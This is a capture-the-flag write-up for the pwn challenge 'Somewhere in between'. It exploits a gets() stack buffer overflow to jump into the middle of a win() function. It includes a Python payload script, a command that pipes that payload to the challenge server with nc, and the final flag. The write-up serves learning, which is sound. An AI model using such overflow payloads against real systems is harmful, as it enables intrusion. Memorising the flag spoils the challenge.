# SOMEWHERE IN BETWEEN - PWN WRITEUP
# Pwn(Easy)

APPROACH:

The first thing I did was check the binary:

file b3twin

Then I looked at the strings inside it:

strings b3twin

There were some interesting strings:

    Not today brosquito! >:3
    cat flag.txt
    I wonder... Maybe you can get in betwin
    blast away :

The important one was:

    cat flag.txt

This suggested that there was a function somewhere in the binary that could read the flag.


1. FIND THE FUNCTIONS

I checked the symbols:

nm -n b3twin

This showed a function called:

    win

The win function was at:

    0x401176


2. CHECK THE MAIN FUNCTION

I disassembled main:

objdump -d -M intel b3twin | sed -n '/<main>:/,/^$/p'

The important part was:

    lea rax,[rbp-0x50]
    mov rdi,rax
    call gets@plt

This means the program creates a buffer at:

    rbp - 0x50

and then uses:

    gets()

to read our input.

gets() does not check the size of the input.

So I can enter more data than the buffer can hold and overwrite things on the stack.

This is the vulnerability.


3. FIND THE BUFFER SIZE

The buffer starts at:

    rbp - 0x50

0x50 in decimal is:

    80 bytes

So the buffer is 80 bytes long.

After the buffer comes:

    saved RBP     = 8 bytes
    return address = 8 bytes

Therefore, the return address is:

    80 + 8 = 88 bytes

from the beginning of our input.


4. FIND WHERE WE WANT TO RETURN

I disassembled the win function:

objdump -d -M intel b3twin | sed -n '/<win>:/,/^$/p'

The function contains:

    cmp DWORD PTR [rbp-0x4],0x0
    je  ...

and later:

    lea rax,[...]
    mov rdi,rax
    call system@plt

The problem is that the win function initially sets its local variable to zero, so simply returning to the beginning of win does not execute the system("cat flag.txt") part.

The useful instruction is slightly further inside the function:

    0x40119a

So instead of returning to:

    win = 0x401176

I return to:

    0x40119a


5. WHY "SOMEWHERE IN BETWEEN"

This is the main trick of the challenge.

The function contains the code that eventually runs:

    system("cat flag.txt")

but we don't want to enter at the very beginning.

We jump somewhere in between the function, directly to the useful part.

Hence the challenge name:

    Somewhere in between


6. MAKE THE CONDITION NON-ZERO

At 0x40119a, the program checks:

    [rbp-0x4]

The last 4 bytes of our 80-byte buffer are located exactly there.

So I make those bytes:

    BBBB

This makes the comparison with zero fail, allowing execution to continue to system().


7. BUILD THE PAYLOAD

The payload layout is:

    76 bytes padding
    4 bytes non-zero value
    8 bytes saved RBP
    8 bytes address 0x40119a

So:

    76 + 4 = 80 bytes buffer
    80 + 8 = 88 bytes
    next 8 bytes overwrite the return address


8. CREATE THE PAYLOAD

I used Python:

python3 - <<'PY' > /tmp/payload
import struct
import sys

payload = b'A' * 76
payload += b'BBBB'
payload += b'C' * 8
payload += struct.pack('<Q', 0x40119a)

sys.stdout.buffer.write(payload)
PY


9. TEST LOCALLY

I created a test flag:

printf 'bi0s{local_test_flag}\n' > flag.txt

Then ran:

./b3twin < /tmp/payload

The program executed:

    system("cat flag.txt")

and printed the contents of flag.txt.

This confirmed that the exploit worked.


10. CONNECT TO THE REMOTE SERVER

The challenge gave:

nc 3.111.53.245 1339

The same payload can be sent to the remote service using:

python3 - <<'PY' | nc 3.111.53.245 1339
import struct
import sys

payload = b'A' * 76
payload += b'BBBB'
payload += b'C' * 8
payload += struct.pack('<Q', 0x40119a)

sys.stdout.buffer.write(payload)
PY


ATTACK FLOW:

Check the binary
        ↓
Find the gets() function
        ↓
gets() has no input-size protection
        ↓
Buffer is 80 bytes
        ↓
Overwrite saved RBP
        ↓
Overwrite return address
        ↓
Find the win() function
        ↓
Jump to 0x40119a inside win()
        ↓
Skip the part that prevents system() from running
        ↓
system("cat flag.txt")
        ↓
Flag is printed


IMPORTANT COMMANDS USED:

file b3twin

strings b3twin

nm -n b3twin

objdump -d -M intel b3twin | sed -n '/<main>:/,/^$/p'

objdump -d -M intel b3twin | sed -n '/<win>:/,/^$/p'

chmod +x b3twin


PAYLOAD:

python3 - <<'PY' > /tmp/payload
import struct
import sys

payload = b'A' * 76
payload += b'BBBB'
payload += b'C' * 8
payload += struct.pack('<Q', 0x40119a)

sys.stdout.buffer.write(payload)
PY


LOCAL TEST:

printf 'bi0s{local_test_flag}\n' > flag.txt
./b3twin < /tmp/payload


REMOTE:

python3 - <<'PY' | nc 3.111.53.245 1339
import struct
import sys

payload = b'A' * 76
payload += b'BBBB'
payload += b'C' * 8
payload += struct.pack('<Q', 0x40119a)

sys.stdout.buffer.write(payload)
PY


FINAL FLAG:

bi0s{s0m3t1mes_y0u_g0tta_l00k_b3twin_th3_l1n35}